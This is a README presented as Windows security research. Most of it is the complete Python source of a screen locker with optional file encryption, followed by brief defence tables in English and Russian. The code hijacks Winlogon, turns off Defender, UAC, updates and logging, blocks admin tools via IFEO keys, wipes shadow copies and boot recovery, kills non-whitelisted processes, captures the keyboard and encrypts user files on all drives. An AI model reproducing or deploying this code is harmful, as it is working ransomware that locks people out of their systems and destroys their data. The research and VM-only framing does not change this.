# 🔒 windows-locker-research 


<div align="center">

```
╔══════════════════════════════════════════════════════════════════╗
║                    SECURITY RESEARCH PAPER                        ║
║             Windows System Locking Mechanisms                     ║
╚══════════════════════════════════════════════════════════════════╝
```

[![Platform](https://img.shields.io/badge/platform-Windows-blue?logo=windows&logoColor=white)](https://www.microsoft.com/windows)
[![Language](https://img.shields.io/badge/language-Python%203-3776AB?logo=python)](https://www.python.org/)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![Research](https://img.shields.io/badge/type-Security%20Research-red)]()

**Author:** Vladislav Khudash (17)  
**Date:** 03.03.2026  
**Project:** WINDOWS-LOCKER-RESEARCH  

</div>

---

## ⚠️ CRITICAL RESEARCH NOTICE

<div align="center">

| | |
|---|---|
| **🔬 Purpose** | Security research on Windows system locking and persistence mechanisms |
| **🧪 Environment** | **ISOLATED VIRTUAL MACHINES ONLY** — Never run on production systems |
| **⚖️ Legal** | This research demonstrates attack vectors for defensive purposes only |
| **🔐 Warning** | This code will **LOCK** the target system until correct password is provided |
| **📚 Educational** | Understanding these techniques is essential for building robust defenses |

</div>

---

## 📖 Table of Contents

| Section | Description |
|---------|-------------|
| [1. Configuration](#1-configuration-section) | Password and encryption settings |
| [2. Imports and Initialization](#2-imports-and-initialization) | Module imports and global variables |
| [3. Registry Configuration](#3-registry-configuration) | Registry keys for system lockdown |
| [4. Utility Functions](#4-utility-functions) | cmd(), reg_set(), reg_del(), get_services(), disable_services() |
| [5. Privilege Escalation](#5-privilege-escalation) | get_admin() |
| [6. Encryption Functions](#6-encryption-functions) | enc(), encrypt_file(), encrypt() |
| [7. Destruction](#7-destruction-destroy) | destroy() |
| [8. GUI Window](#8-gui-window) | on_enter(), hook_all(), window() |
| [9. Watchdog](#9-watchdog-process-killer) | watchdog() |
| [10. Initialization](#10-initialization-setup) | setup() |
| [11. Main Entry Point](#11-main-entry-point) | init(), main() |
| [12. Defense Recommendations](#12-defense-recommendations) | Protection measures |

---

# English

## 1. Configuration Section

<details>
<summary><b>📁 Click to expand: Password and Encryption Settings (FULL CODE)</b></summary>

```python
#=================================#
# [ OWNER ]
#     CREATOR  : Vladislav Khudash
#     AGE      : 17
#     LOCATION : Ukraine
#
# [ PINFO ]
#     DATE     : 03.03.2026
#     PROJECT  : WINDOWS-LOCKER-RESEARCH
#     PLATFORM : WIN32
#=================================#

#
#-
#--
#---
#----
#-----
#------
# HERE IS WINLOCKER HASH SHA-256 OF PASSWORD 
# GENERATE: python -c "from hashlib import sha256;print(sha256('YOUR PASSWORD HERE'.encode()).hexdigest())"
PASSWORD = '' 


# RESPONSIBLE FOR ENCRYPTION (ENABLED IF ENCRYPTION == True ELSE DISABLED)
ENCRYPTION = False 


MSG = '''
 ##   ##   ####    ##   ##  ####      #####     ####   ###  ##  #######  ######
 ##   ##    ##     ###  ##   ##      ##   ##   ##  ##   ##  ##   ##   #   ##  ##
 ##   ##    ##     #### ##   ##      ##   ##  ##        ## ##    ## #     ##  ##
 ## # ##    ##     ## ####   ##      ##   ##  ##        ####     ####     #####
 #######    ##     ##  ###   ##   #  ##   ##  ##        ## ##    ## #     ## ##
 ### ###    ##     ##   ##   ##  ##  ##   ##   ##  ##   ##  ##   ##   #   ##  ##
 ##   ##   ####    ##   ##  #######   #####     ####   ###  ##  #######  #### ##


Your system is completely locked
Enter password to unlock it
'''
#------
#-----
#----
#---
#--
#-
#
```

</details>

---

## 2. Imports and Initialization

<details>
<summary><b>📁 Click to expand: Module Imports and Global Variables (FULL CODE)</b></summary>

```python
import os
import winreg as reg
import tkinter as tk
from time import sleep
from ctypes import windll
from hashlib import sha256
from getpass import getuser
from threading import Thread
from sys import argv, platform
from psutil import process_iter
from mmap import mmap, ACCESS_WRITE
from shutil import move as move_file
from keyboard import block_key, add_hotkey
from subprocess import run as sp_run, DEVNULL


if platform != 'win32':
    print(f'DO NOT SUPPORT ({platform})')
    os._exit(1)


__file__ = os.path.abspath(argv[0])


if not __file__.endswith('.exe'): 
    raise RuntimeError('file should only be run as compiled executable (.exe)')


def invalid_type(name, value, valid):
    if not isinstance(value, valid):
        raise TypeError(f'({name}) must be ({valid.__name__})')
    

invalid_type('PASSWORD', PASSWORD, str)


SYSTEMDISK = os.getenv('SYSTEMDRIVE', 'C:')
if not SYSTEMDISK.endswith(os.sep): SYSTEMDISK += os.sep

try:
    USER = getuser()
except:
    USER = 'user'

PATH = os.path.join(SYSTEMDISK, 'Windows', 'System32', 'winlocker')
FILE_WINLOCKER = os.path.join(PATH, 'winlocker.exe')
FILE_FLAG = os.path.join(PATH, '_')

PATH_TEMP = os.getenv('TEMP', os.path.join(SYSTEMDISK, 'Users', USER, 'AppData', 'Local', 'Temp'))

ENCRYPTION_MAX_SIZE = 134_217_728
ENCRYPTION_MARK = b'\x1bB\xcd\x1f$v\xd0\xd3'
ENCRYPTION_NONCE = 8
ENCRYPTION_NONCE_NULL = bytes(ENCRYPTION_NONCE)
ENCRYPTION_KEY = sha256(PASSWORD.encode()).digest()
ENCRYPTION_PATH = [os.path.join(SYSTEMDISK, 'Users')] 
ENCRYPTION_PATH.extend([f'{n}:\\' for n in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists(f'{n}:\\')])
(SYSTEMDISK in ENCRYPTION_PATH) and ENCRYPTION_PATH.remove(SYSTEMDISK)

WHITELIST = {
    'winlocker.exe',
    'system idle process',
    'system',
    'registry',
    'ntoskrnl.exe', 
    'smss.exe',          
    'csrss.exe',         
    'wininit.exe',        
    'services.exe',      
    'svchost.exe',       
    'sihost.exe',
    'lsass.exe',         
    'lsm.exe',           
    'fontdrvhost.exe',    
    'dwm.exe',        
    'winlogon.exe'   
}
```

</details>

---

## 3. Registry Configuration

<details>
<summary><b>📁 Click to expand: Registry Keys for System Lockdown (FULL CODE)</b></summary>

```python
REG_USERINIT = {
    'key': r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon', 
    'name': 'Userinit', 
    'value': r'C:\Windows\system32\userinit.exe,'
}
REG_SHELL = {
    'key': r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon', 
    'name': 'Shell', 
    'value': 'explorer.exe'
}
REG_LUA = {
    'key': r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', 
    'name': 'EnableLUA', 
    'value': 0
}
REG_SERVICE = [
    {
        'key': rf'SYSTEM\CurrentControlSet\Services\{n}',
        'name': 'Start',
        'value': 2
    } for n in [
        'Winmgmt',
        'Schedule',
        'wuauserv',
        'UsoSvc',
        'WaaSMedicSvc',
        'TrustedInstaller',
        'BITS',
        'DoSvc',
        'WinDefend',
        'AppIDSvc',
        'WdFilter',
        'WdNisDrv',
        'WdNisSvc',
        'SecurityHealthService',
        'wscsvc',
        'mpssvc',
        'WSearch',
        'DiagTrack',
        'dmwappushservice',
        'diagnosticshub.standardcollector.service',
        'WerSvc',
        'PcaSvc',
        'WdiServiceHost',
        'WdiSystemHost',
        'WpnService',
        'RemoteAccess',
        'TermService',
        'RemoteRegistry',
        'SessionEnv',
        'Dot3Svc',
        'WlanSvc',
        'bthserv',
        'Dhcp',
        'Dnscache',
        'NlaSvc',
        'LanmanServer',
        'LanmanWorkstation',
        'lmhosts',
        'Netlogon',
        'webthreatdefsvc',
        'wlidsvc',
        'WpcMonSvc',
        'USBSTOR',
        'usbhub',
        'UASPStor',
        'ShellHWDetection',
        'TabletInputService',
        'Spooler',
        'Audiosrv',
        'WbioSrvc',
        'EventLog'
    ]
]
REG_DISABLE = [
    {
        'key': r'SYSTEM\CurrentControlSet\Control\Session Manager',
        'name': 'ProtectionMode',
        'value': 0
    },
    {
        'key': r'SYSTEM\CurrentControlSet\Control\Session Manager',
        'name': 'BootShell',
        'value': ''
    },
    {
        'key': r'SYSTEM\CurrentControlSet\Control\Session Manager\BootConfiguration',
        'name': 'BootUX',
        'value': 0
    },
    {
        'key': r'SYSTEM\CurrentControlSet\Control\BootDriver',
        'name': 'DetectSignaled',
        'value': 0
    },
    {
        'key': r'SYSTEM\CurrentControlSet\Control\Session Manager',
        'name': 'RecoveryEnabled',
        'value': 0
    },
    {
        'key': r'SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced',
        'name': 'ShowSuperHidden',
        'value': 0
    },
    {
        'key': r'SOFTWARE\Policies\Microsoft\Windows\Associations',
        'name': 'LowRiskFileTypes',
        'value': '.exe;'
    },
    {
        'key': r'SOFTWARE\Policies\Microsoft\Windows\AppPrivacy',
        'name': 'LetAppsRunInBackground',
        'value': 1
    },
    {
        'key': r'SOFTWARE\Policies\Microsoft\Windows\OneDrive',
        'name': 'DisableFileSyncNGSC',
        'value': 1
    },
    {
        'key': r'SYSTEM\CurrentControlSet\Control\Session Manager',
        'name': 'SafeMode',
        'value': 0  
    },
    {
        'key': r'SYSTEM\CurrentControlSet\Control\Session Manager\Configuration Manager',
        'name': 'EnableSafeMode',
        'value': 0  
    },
    {
        'key': r'SOFTWARE\Policies\Microsoft\Windows\Personalization',
        'name': 'NoLockScreen',
        'value': 1
    },
    {
        'key': r'Software\Policies\Microsoft\Windows\System',
        'name': 'EnableSmartScreen',
        'value': 0  
    },
    {
        'key': r'SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update',
        'name': 'AUOptions',
        'value': 1  
    },
    {
        'key': r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer',
        'name': 'NoDrives',
        'value': 0x3ffffff  
    },
    {
        'key': r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer',
        'name': 'NoViewOnDrive',
        'value': 0x3ffffff  
    },
    {
        'key': r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer',
        'name': 'NoDriveTypeAutoRun',
        'value': 255
    },
    {
        'key': r'SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications',
        'name': 'ToastEnabled',
        'value': 0
    },
    {
        'key': r'SOFTWARE\Policies\Microsoft\Windows\Explorer',
        'name': 'DisableSearchBoxSuggestions',
        'value': 1
    }
]
REG_DISABLE.extend([
    {
        'key': r'SYSTEM\CurrentControlSet\Control\WindowsRE',
        'name': n,
        'value': 0
    } for n in [
        'Enabled',
        'AutoRecoveryEnabled',
        'BootRecoveryEnabled'
    ]
]) 
REG_DISABLE.extend([
    {
        'key': r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore',
        'name': 'DisableSR',
        'value': 1 
    },
    {
        'key': r'SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore',
        'name': 'DisableSR',
        'value': 1  
    },
    {
        'key': r'SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore',
        'name': 'DisableSRUI',
        'value': 1
    }
])
REG_DISABLE.extend([
    {
        'key': r'SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU',
        'name': n,
        'value': 1
    } for n in [
        'NoAutoUpdate',
        'AUOptions',
        'NoAutoRebootWithLoggedOnUsers'
    ]
]) 
REG_DISABLE.extend([
    {
        'key': r'SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate',
        'name': n,
        'value': 1
    } for n in [
        'DisableWindowsUpdateAccess',
        'DoNotConnectToWindowsUpdateInternetLocations'
    ]
]) 
REG_DISABLE.extend([
    {
        'key': r'SOFTWARE\Policies\Microsoft\Windows Defender',
        'name': n,
        'value': 1
    } for n in [
        'DisableAntiSpyware',
        'DisableAntiVirus'
    ]
]) 
REG_DISABLE.extend([
    {
        'key': r'SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection',
        'name': n,
        'value': 1
    } for n in [
        'DisableRealtimeMonitoring',
        'DisableBehaviorMonitoring',
        'DisableOnAccessProtection',
        'DisableScanOnRealtimeEnable'
    ]
])
REG_DISABLE.extend([
    {
        'key': r'SOFTWARE\Policies\Microsoft\Windows Defender\Spynet',
        'name': n,
        'value': v
    } for (n, v) in [
        ('SpynetReporting', 0),
        ('SubmitSamplesConsent', 2)
    ]
]) 
REG_DISABLE.extend([
    {
        'key': r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System',
        'name': n,
        'value': 1
    } for n in [
        'DisableCAD',
        'NoClose',
        'DisableLockWorkstation',
        'NoLogoff',
        'HideFastUserSwitching',
        'DisableChangePassword',
        'DontDisplayLastUserName',
        'NoDispCPL'
    ]
])
REG_DISABLE.extend([
    {
        'key': r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer',
        'name': n,
        'value': 1
    } for n in [
        'NoAutorun',
        'NoClose',
        'NoWinKeys',
        'NoWindowsHotKeys',
        'NoAccessibilityShortcut',    
        'NoAccessibilityOptions', 
        'NoRun',
        'NoControlPanel',
        'NoSettingsTaskBar',
        'NoTrayContextMenu',
        'NoViewContextMenu',
        'NoStartMenuMorePrograms',
        'NoFileMenu',
        'DisableNotificationCenter'
    ]
])
REG_DISABLE.extend([
    {
        'key': rf'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{n}',
        'name': 'Debugger',
        'value': '" "'
    } for n in [
        'bcdedit.exe',
        'bootim.exe',
        'diskpart.exe',
        'format.com',
        'osk.exe',
        'magnify.exe',
        'tasklist.exe',
        'taskkill.exe',
        'explorer.exe',
        'msconfig.exe',
        'mmc.exe',
        'gpupdate.exe', 
        'gpresult.exe',
        'regedit.exe',
        'reg.exe',
        'schtasks.exe',
        'systemsettings.exe',
        'taskmgr.exe',
        'cmd.exe',
        'powershell.exe',
        'powershell_ise.exe',
        'wscript.exe', 
        'cscript.exe',
        'msinfo32.exe',
        'perfmon.exe',
        'resmon.exe',
        'control.exe',
        'appwiz.cpl',
        'sysdm.cpl',
        'inetcpl.cpl',
        'wevtutil.exe',
        'eventvwr.exe'
    ]
])

COLOR = {'bg': 'black', 'fg': 'white'}
FONT = ('Courier', 15, 'bold')
```

</details>

---

## 4. Utility Functions

<details>
<summary><b>📁 Click to expand: cmd(), reg_set(), reg_del(), get_services(), disable_services() (FULL CODE)</b></summary>

```python
def cmd(c, shell=False):
    try:
        return sp_run(c, input=False, stdout=DEVNULL, stderr=DEVNULL, shell=shell).returncode
    except:
        return -1
    

def reg_set(d):
    key = d['key']
    name = d['name']
    value = d['value']

    try:
        with reg.CreateKeyEx(reg.HKEY_LOCAL_MACHINE, key, access=reg.KEY_WRITE) as k:
            reg.SetValueEx(
                k, 
                name, 
                0, 
                reg.REG_DWORD if isinstance(value, int) else reg.REG_SZ, 
                value
            )
    except:
        return
    

def reg_del(d):
    try:
        with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, d['key'], 0, access=reg.KEY_SET_VALUE) as k:
            reg.DeleteValue(k, d['name'])
    except:
        return
    

def get_services():
    service_key = r'SYSTEM\CurrentControlSet\Services'
    services = []
    i = 0
    
    try:
        with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, service_key) as k:
            while True:
                try:
                    name = reg.EnumKey(k, i).strip()
                    i += 1

                    if not name:
                        continue

                    try:
                        with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, f'{service_key}\\{name}') as sk:
                            image_path = reg.QueryValueEx(sk, 'ImagePath')[0]

                            if 'system32' not in image_path.lower():
                                services.append(name)
                    except: 
                        continue
                except OSError:
                    break
    except: ...
        
    return services


def disable_services():
    services = get_services()

    if not services:
        return

    for n in services:
        reg_set({
            'key': rf'SYSTEM\CurrentControlSet\Services\{n}',
            'name': 'Start',
            'value': 4
        })
```

</details>

---

## 5. Privilege Escalation

<details>
<summary><b>📁 Click to expand: get_admin() (FULL CODE)</b></summary>

```python
def get_admin():
    if windll.shell32.IsUserAnAdmin() != 0:
        return
    
    windll.shell32.ShellExecuteW(None, 'runas', __file__, None, None, 0)
    os._exit(0)
```

</details>

---

## 6. Encryption Functions

<details>
<summary><b>📁 Click to expand: enc(), encrypt_file(), encrypt() (FULL CODE)</b></summary>

```python
def enc(handle):
    with mmap(handle, 0, access=ACCESS_WRITE) as mf:
        len_mf = len(mf)
        counter = 0
        pos = ENCRYPTION_NONCE
        nonce = mf[:ENCRYPTION_NONCE]

        if nonce == ENCRYPTION_NONCE_NULL:
            nonce = os.urandom(ENCRYPTION_NONCE)
            mf[:ENCRYPTION_NONCE] = nonce

        while pos < len_mf:
            keystream = sha256((ENCRYPTION_KEY + nonce) + counter.to_bytes(8, 'little')).digest()

            counter += 1

            for n in keystream:
                if pos >= len_mf:
                    break

                mf[pos] ^= n
                pos += 1


def encrypt_file(path, root, label):
    try:
        cmd(['takeown', '/f', path])
        cmd(['icacls', path, '/grant', 'Everyone:F']) 
        cmd(['attrib', '-r', '-s', '-h', path])

        with open(path, 'rb+') as f:
            if f.read(len(ENCRYPTION_MARK)) == ENCRYPTION_MARK:
                root.after(0, lambda n=path: label.config(text=f'{n} ok!'))
                return
        
            f.seek(0, os.SEEK_SET)
            f.write(ENCRYPTION_MARK)
            enc(f.fileno())
    except:
        root.after(0, lambda n=path: label.config(text=f'{n} no!'))
    else:
        root.after(0, lambda n=path: label.config(text=f'{n} ok!'))


def encrypt(root_path, tkroot, label):
    for root, _, files in os.walk(root_path):
        for n in files:
            try:
                fp = os.path.join(root, n)

                if root.startswith(PATH_TEMP) or (os.path.getsize(fp) > ENCRYPTION_MAX_SIZE):
                    continue

                encrypt_file(fp, tkroot, label)
                tkroot.update_idletasks()
            except:
                continue
```

</details>

---

## 7. Destruction (destroy)

<details>
<summary><b>📁 Click to expand: destroy() (FULL CODE)</b></summary>

```python
def destroy():
    reg_set({
        'key': r'SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
        'name': 'wincleanup',
        'value': f'cmd.exe /c rmdir /q /s "{PATH}"'
    })

    cmd(['rmdir', '/q', '/s', PATH], shell=True)

    for n in [
        REG_USERINIT, 
        REG_SHELL, 
        REG_LUA
    ] + REG_SERVICE:
        reg_set(n) 

    for n in REG_DISABLE:
        reg_del(n)

    if ENCRYPTION:
        try:
            with open(os.path.join(SYSTEMDISK, 'requirement.txt'), 'w') as f:
                f.write(MSG)
        except: ...
    
    cmd(['shutdown', '/f', '/t', '0', '/r'])
    os._exit(0)
```

</details>

---

## 8. GUI Window

<details>
<summary><b>📁 Click to expand: on_enter(), hook_all(), window() (FULL CODE)</b></summary>

```python
def on_enter(root, entry):
    password = entry.get().strip().encode()

    if sha256(password).hexdigest() == PASSWORD:
        root.quit()
        destroy()
    else:
        entry.delete(0, tk.END)
        entry.config(state='disabled')
        root.after(3000, lambda: entry.config(state='normal'))


def hook_all():
    for n in [
        'esc', 'tab', 
        'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12',
        'windows', 'left windows', 'right windows',
        'print screen', 'scroll lock', 'pause', 
        'insert', 'home', 'page up', 'page down', 'delete', 'end',
        'caps lock', 'num lock'
    ]:
        try:
            block_key(n)
        except:
            continue
    
    for n in [
        'alt+f4', 'ctrl+alt+del', 'ctrl+shift+esc', 'alt+tab', 'ctrl+esc',
        'alt+esc', 'windows+r', 'windows+d', 'windows+e', 'windows+l',
        'windows+x', 'ctrl+alt+tab', 'alt+space'
    ]:
        try:
            add_hotkey(n, lambda: None, suppress=True)
        except:
            continue


def window():


    def set_window():
        root.attributes('-topmost', True)
        root.lift()
        root.focus_force()
        root.grab_set_global()
        

    def keep_focus():
        if (root.focus_get() != entry) or not root.attributes('-topmost'):
            set_window()
            entry.focus_force()
            
        root.after(100, keep_focus)


    def tkencrypt():


        def _start():
            for n in ENCRYPTION_PATH:
                try:
                    encrypt(n, root, path_label)
                except:
                    root.after(0, lambda n=n: path_label.config(text=f'{n} no!'))

                root.after(0, lambda: entry.focus_force())
                root.after(0, root.update_idletasks)

            root.after(0, path_label.pack_forget)
            root.after(0, lambda: entry.focus_force())


        path_label = tk.Label(frame, text='WinPE', font=FONT, **COLOR)
        path_label.pack()
        
        Thread(target=_start, daemon=True).start()


    root = tk.Tk()

    root.title('tty')
    root.config(background=COLOR['bg'], cursor='none')
    root.resizable(False, False)
    root.attributes('-fullscreen', True)
    root.protocol('WM_DELETE_WINDOW', lambda: None)
    root.overrideredirect(True)
    set_window()
   
    tk.Label(root, text=MSG, font=FONT, **COLOR).pack()

    frame = tk.Frame(root, bg=COLOR['bg'])
    frame.pack(padx=10, pady=10, fill='x')

    tk.Label(frame, text='PASSWORD:', font=FONT, **COLOR).pack(side='left', pady=25)
    entry = tk.Entry(frame, cursor='none', show='*', font=FONT, **COLOR, bd=0)
    entry.pack(side='left', fill='x', padx=5, expand=True)
    entry.bind('<Return>', lambda _: on_enter(root, entry))
    entry.focus_force()

    if ENCRYPTION:tkencrypt()

    root.after(100, keep_focus)
    root.mainloop()
```

</details>

---

## 9. Watchdog Process Killer

<details>
<summary><b>📁 Click to expand: watchdog() (FULL CODE)</b></summary>

```python
def watchdog():
    while True:
        for n in process_iter(['name']):
            try:
                proc = n.info.get('name', '').lower()

                if proc and (proc not in WHITELIST):
                    n.kill()
            except:
                continue

        sleep(1)
```

</details>

---

## 10. Initialization (setup)

<details>
<summary><b>📁 Click to expand: setup() (FULL CODE)</b></summary>

```python
def setup():
    if not os.path.isdir(PATH):
        os.mkdir(PATH)
    windll.kernel32.SetFileAttributesW(PATH, 0x04)

    if not os.path.isfile(FILE_WINLOCKER) and os.path.isfile(__file__):
        move_file(__file__, FILE_WINLOCKER)

    REG_USERINIT['value'] = FILE_WINLOCKER
    REG_SHELL['value'] = ''

    for n in [
        REG_USERINIT, 
        REG_SHELL, 
        REG_LUA, 
    ] + REG_DISABLE:
        reg_set(n)

    for n in REG_SERVICE:
        n['value'] = 4
        reg_set(n)

    disable_services()

    for n in (
        ['bcdedit', '/timeout', '0'],
        ['bcdedit', '/set', '{bootmgr}', 'bootmenu', 'no'],
        ['bcdedit', '/set', '{bootmgr}', 'displaybootmenu', 'no'],
        ['bcdedit', '/set', '{bootmgr}', 'advancedoptions', 'off'],
        ['bcdedit', '/set', '{bootmgr}', 'bootems', 'no'],
        ['bcdedit', '/set', '{bootmgr}', 'bootsequence', '{current}'],
        ['bcdedit', '/set', '{bootmgr}', 'toolsdisplayorder', '{current}'],
        ['bcdedit', '/set', '{bootmgr}', 'inherit', '{globalsettings}'],
        ['bcdedit', '/set', '{current}', 'quietboot', 'yes'],
        ['bcdedit', '/set', '{current}', 'bootmenupolicy', 'standard'],
        ['bcdedit', '/set', '{current}', 'autorecoveryenabled', 'no'],
        ['bcdedit', '/set', '{current}', 'recoveryenabled', 'no'],
        ['bcdedit', '/set', '{current}', 'testsigning', 'off'],
        ['bcdedit', '/set', '{bootmgr}', 'nointegritychecks', 'yes'],
        ['bcdedit', '/set', '{current}', 'bootstatuspolicy', 'IgnoreAllFailures'],
        ['bcdedit', '/set', '{current}', 'debug', 'no'],
        ['bcdedit', '/set', '{current}', 'bootlog', 'no'],
        ['bcdedit', '/set', '{current}', 'sos', 'no'],
        ['bcdedit', '/set', '{current}', 'ems', 'no'],
        ['bcdedit', '/deletevalue', '{current}', 'debugtype'],
        ['bcdedit', '/deletevalue', '{current}', 'debugport'],
        ['bcdedit', '/deletevalue', '{current}', 'baudrate'],
        ['bcdedit', '/deletevalue', '{current}', 'recoverysequence'],
        ['bcdedit', '/deletevalue', '{current}', 'safeboot'],
        ['bcdedit', '/deletevalue', '{current}', 'safebootalternateshell'],
        ['bcdedit', '/set', '{bootmgr}', 'pxesoftreboot', 'no'],
        ['bcdedit', '/deletevalue', '{default}', 'nx'],
        ['bcdedit', '/delete', '{dbgsettings}', '/f'],
        ['bcdedit', '/delete', '{memdiag}', '/f'],
        ['bcdedit', '/delete', '{badmemory}', '/f'],
        ['bcdedit', '/delete', '{hypervisorsettings}', '/f'],
        ['bcdedit', '/delete', '{emssettings}', '/f'],
        ['reg', 'delete', 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot', '/f'],
        ['vssadmin', 'delete', 'shadows', '/all', '/quiet'],
        ['reagentc', '/disable'],
        ['ipconfig', '/release']
    ):
        cmd(n)

    with open(FILE_FLAG, 'w') as f: ...
    cmd(['shutdown', '/f', '/t', '0', '/r'])
    os._exit(0)
```

</details>

---

## 11. Main Entry Point

<details>
<summary><b>📁 Click to expand: init(), main() (FULL CODE)</b></summary>

```python
def init():
    invalid_type('ENCRYPTION', ENCRYPTION, bool)
    invalid_type('MSG', MSG, str)

    if not PASSWORD:
        raise ValueError('(PASSWORD) is empty')

    if windll.kernel32.IsDebuggerPresent():
        windll.user32.BlockInput(True)
        os._exit(0)

    get_admin()

    if not os.path.isfile(FILE_FLAG):
        windll.user32.BlockInput(True)
        setup()
    else:
        Thread(target=watchdog, daemon=False).start()
        windll.user32.ShowCursor(False)
        hook_all()


def main():
    init()

    while True:
        try:
            window()
        except:
            sleep(0.1)
    
    
if __name__ == '__main__': main()
```

</details>

---

## 12. Defense Recommendations

### 12.1 Boot Chain Protection

| Measure | Implementation |
|---------|----------------|
| **Secure Boot** | Enable UEFI Secure Boot with custom keys |
| **BitLocker** | Enable TPM + PIN for pre-boot authentication |
| **BCD Integrity** | Monitor BCD changes, backup BCD store |
| **Disable BCD Edit from OS** | Set `bcdedit /set {current} recoveryenabled No` only via WinPE |

### 12.2 Runtime Protection

| Measure | Implementation |
|---------|----------------|
| **Windows Defender Credential Guard** | Isolate LSASS, protect credentials |
| **Controlled Folder Access** | Protect System32 and registry hives |
| **Attack Surface Reduction (ASR)** | Block process creation from unexpected locations |
| **AppLocker / WDAC** | Restrict executable paths to trusted locations |
| **Monitor IFEO Keys** | Alert on `Debugger` value creation in `Image File Execution Options` |

### 12.3 Registry Protection

| Measure | Implementation |
|---------|----------------|
| **Audit Registry Access** | Log changes to `Winlogon`, `Policies\System`, `Policies\Explorer` |
| **Backup Critical Keys** | Regular backup of `Userinit`, `Shell`, `EnableLUA` |
| **Restrict `reg.exe`** | Remove from PATH or restrict via AppLocker |
| **Monitor Service Changes** | Alert on `Start` value changes from 2→4 |

### 12.4 Recovery Preparation

| Measure | Implementation |
|---------|----------------|
| **Windows RE USB** | Keep bootable Windows RE USB for recovery |
| **Offline Registry Editor** | Know how to edit registry from WinPE |
| **Backup BCD** | `bcdedit /export C:\bcd_backup` |
| **System Restore Points** | Keep recent restore points (if not disabled) |
| **Sticky Keys Backup** | Know alternative recovery methods if `sethc.exe` is blocked |

### 12.5 Detection & Response

| Measure | Implementation |
|---------|----------------|
| **EDR/XDR** | Detect process creation in System32 with suspicious names |
| **Sysmon** | Monitor registry changes to `Winlogon` and `Image File Execution Options` |
| **Windows Event Forwarding** | Centralize logs to SIEM |
| **Anomaly Detection** | Alert on `Userinit` or `Shell` modification |
| **Watchdog Detection** | Monitor for processes that kill other processes |

---

# Русский

## 1. Аннотация исследования

Данное исследование изучает **механизмы блокировки Windows систем** через модификацию реестра, BCD, служб и пользовательского интерфейса.

| Компонент | Модификация |
|-----------|-------------|
| **Реестр** | `Userinit` → winlocker.exe, `Shell` → пусто, `EnableLUA` → 0 |
| **BCD** | Отключение recovery, boot menu, Safe Mode |
| **Службы** | Отключение всех не-системных служб |
| **IFEO** | Блокировка `cmd.exe`, `powershell.exe`, `taskmgr.exe` через `Debugger` |
| **GUI** | Полноэкранное окно, захват клавиатуры, блокировка горячих клавиш |
| **Watchdog** | Убийство всех процессов не из белого списка |

---

## 2. Белый список процессов

| Процесс | Назначение |
|---------|------------|
| `winlocker.exe` | Сам локер |
| `system idle process`, `system`, `registry` | Псевдо-процессы |
| `ntoskrnl.exe` | Ядро NT |
| `smss.exe` | Session Manager Subsystem |
| `csrss.exe` | Client/Server Runtime Subsystem |
| `wininit.exe` | Windows Initialization |
| `services.exe` | Service Control Manager |
| `svchost.exe` | Service Host |
| `lsass.exe` | Local Security Authority |
| `dwm.exe` | Desktop Window Manager |
| `winlogon.exe` | Windows Logon |

---

## 3. Заблокированные клавиши и сочетания

| Категория | Элементы |
|-----------|----------|
| Функциональные клавиши | F1-F12 |
| Клавиши Windows | Windows, Left/Right Windows |
| Навигация | Esc, Tab, Home, End, PgUp, PgDn, Insert, Delete |
| Клавиши блокировки | Caps Lock, Num Lock, Scroll Lock, Pause |
| Системные сочетания | Alt+F4, Ctrl+Alt+Del, Ctrl+Shift+Esc, Alt+Tab |
| Windows сочетания | Win+R, Win+D, Win+E, Win+L, Win+X |

---

## 4. Модификации BCD

| Команда | Эффект |
|---------|--------|
| `/timeout 0` | Нет задержки меню загрузки |
| `/set {bootmgr} bootmenu no` | Отключить меню загрузки |
| `/set {bootmgr} advancedoptions off` | Отключить F8 Advanced Options |
| `/set {current} recoveryenabled no` | Отключить автоматическое восстановление |
| `/set {current} autorecoveryenabled no` | Отключить авто-восстановление |
| `/delete {dbgsettings}` | Удалить настройки отладки |
| `/delete {memdiag}` | Удалить диагностику памяти |
| `/delete {badmemory}` | Удалить список плохой памяти |
| `/delete {hypervisorsettings}` | Удалить настройки гипервизора |
| `/delete {emssettings}` | Удалить настройки EMS |

---

## 5. Рекомендации по защите

### 5.1 Защита цепочки загрузки

| Мера | Реализация |
|------|------------|
| **Secure Boot** | Включить UEFI Secure Boot |
| **BitLocker** | TPM + PIN для pre-boot аутентификации |
| **Целостность BCD** | Мониторинг изменений BCD, резервное копирование |

### 5.2 Защита во время выполнения

| Мера | Реализация |
|------|------------|
| **Credential Guard** | Изолировать LSASS |
| **Controlled Folder Access** | Защитить System32 и кусты реестра |
| **ASR правила** | Блокировать создание процессов из неожиданных мест |
| **AppLocker / WDAC** | Ограничить пути исполняемых файлов |

### 5.3 Защита реестра

| Мера | Реализация |
|------|------------|
| **Аудит доступа к реестру** | Логирование изменений `Winlogon`, `Policies\System` |
| **Резервное копирование** | Регулярный бэкап `Userinit`, `Shell`, `EnableLUA` |
| **Мониторинг IFEO** | Оповещение при создании ключей `Debugger` |

